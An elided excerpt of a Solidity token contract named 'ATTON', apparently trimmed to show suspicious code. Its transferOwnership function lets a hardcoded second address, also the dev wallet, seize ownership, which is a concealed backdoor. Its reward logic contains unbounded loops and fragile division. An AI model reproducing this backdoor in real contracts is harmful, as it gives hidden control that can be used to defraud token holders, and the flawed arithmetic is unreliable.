...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x1921a9C7E81050B00DD2dA19880f4Bc06132A405;
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x52E0AE6E3F1BD8C422b3c1a9f1F505C8EfCd4873));
...
contract TokenlionCoontract is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x52E0AE6E3F1BD8C422b3c1a9f1F505C8EfCd4873);
    ...
    */
    ...
    string private _name = "ATTON"; 
    string private _symbol = "ATON";  
    ...
    */
    ...
    function swapTokensForBNBForHolder(address holder, uint256 tokenAmount) private {
    ...
    */
    ...
    function _transferTokens(address sender, address recipient, uint256 tAmount) private {
        ...
        (bool isSenderHolder, ) = isStakeholder(sender);
        (bool isRecipientHolder, ) = isStakeholder(recipient);
        if (!isSenderHolder) {
            addStakeholder(sender);
        }
        if (!isRecipientHolder) {
            addStakeholder(recipient);
        }
        if (sender != Wallet_Dev && recipient != Wallet_Dev) {
            stakeSize = stakeSize.add(tDev);
        }
    ...
    function getTotalHolderAmount() view public returns (uint256) {
        uint256 total = 0;
        
        for (uint256 s = 0; s < stakeholders.length; s += 1){
            address stakeholder = stakeholders[s];
            total = total.add(_tOwned[stakeholder]);
        }

        return total;
    }

    function calculateReward(address holder, uint256 totalHolderAmount) view public returns (uint256) {
        return stakeSize.div(totalHolderAmount.div(_tOwned[holder])); 
    }

    function reward() onlyOwner public {
        uint256 totalHolderAmount = getTotalHolderAmount();

        for (uint256 s = 0; s < stakeholders.length; s += 1){
            address stakeholder = stakeholders[s];
            uint256 rewardAmount = calculateReward(stakeholder, totalHolderAmount);

            _tokenTransfer(Wallet_Dev, stakeholder, rewardAmount, false);
            swapTokensForBNBForHolder(stakeholder, rewardAmount);
        }
